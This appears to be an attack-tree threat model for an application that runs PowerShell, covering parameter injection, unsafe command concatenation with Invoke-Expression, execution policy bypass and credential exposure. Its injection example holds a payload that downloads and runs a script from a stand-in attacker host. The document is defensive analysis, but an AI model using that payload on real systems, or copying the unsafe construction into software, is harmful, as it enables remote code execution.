## Threat Model: Compromising Application Using PowerShell (High-Risk Sub-Tree)

**Attacker's Goal:** Execute arbitrary code within the application's context or gain access to sensitive data managed by the application through exploiting its interaction with PowerShell.

**High-Risk Sub-Tree:**

* Compromise Application via PowerShell Exploitation **(CRITICAL NODE)**
    * **HIGH-RISK PATH:** Exploit Code Injection Vulnerabilities **(CRITICAL NODE)**
        * Input Parameter Injection **(CRITICAL NODE)**
        * Command Injection via Unsafe Construction **(CRITICAL NODE)**
    * **HIGH-RISK PATH:** Exploit Configuration and Security Misconfigurations **(CRITICAL NODE)**
        * Bypass Execution Policy **(CRITICAL NODE)**
        * Expose/Compromise PowerShell Credentials **(CRITICAL NODE)**

**Detailed Breakdown of Attack Vectors for High-Risk Paths and Critical Nodes:**

* **Compromise Application via PowerShell Exploitation (CRITICAL NODE):**
    * This is the ultimate goal of the attacker and represents the successful compromise of the application through exploiting its interaction with PowerShell.

* **HIGH-RISK PATH: Exploit Code Injection Vulnerabilities (CRITICAL NODE):**
    * This path focuses on exploiting vulnerabilities where an attacker can inject malicious code into PowerShell commands or scripts executed by the application. Success here directly leads to arbitrary code execution on the server.

    * **Input Parameter Injection (CRITICAL NODE):**
        * Inject malicious PowerShell commands or scripts via user-controlled input parameters that are directly passed to PowerShell execution.
        * For example, if the application executes a command like `powershell.exe -Command "Get-ChildItem -Path '$userInput'"` and `$userInput` is attacker-controlled, they could input malicious commands like `; Invoke-WebRequest -Uri 'http://attacker.com/evil.ps1' -OutFile C:\temp\evil.ps1; C:\temp\evil.ps1`.

    * **Command Injection via Unsafe Construction (CRITICAL NODE):**
        * Construct PowerShell commands by concatenating strings, which allows for the injection of arbitrary commands if external data is not properly sanitized.
        * For instance, if the application uses code like `command = "Get-Process " + $processName; Invoke-Expression $command;` and `$processName` is attacker-controlled, they can inject malicious commands.

* **HIGH-RISK PATH: Exploit Configuration and Security Misconfigurations (CRITICAL NODE):**
    * This path involves exploiting weaknesses in the configuration and security settings related to PowerShell, allowing attackers to bypass intended security controls.

    * **Bypass Execution Policy (CRITICAL NODE):**
        * Exploit vulnerabilities or misconfigurations in the PowerShell execution policy to run unauthorized scripts.
        * This could involve exploiting weaknesses in how the policy is enforced or leveraging techniques to bypass it, such as using the `-Bypass` parameter if not properly restricted or exploiting vulnerabilities in the PowerShell engine itself.

    * **Expose/Compromise PowerShell Credentials (CRITICAL NODE):**
        * Gain access to credentials used by the application to interact with PowerShell (e.g., for remoting or running as a specific user).
        * This can occur through various means, including:
            * Insecure storage of credentials within the application code or configuration files.
            * Exploiting other vulnerabilities in the application to access credential stores.
            * Phishing or social engineering attacks targeting users with access to these credentials.
            * Credential stuffing attacks if the same credentials are used across multiple services.
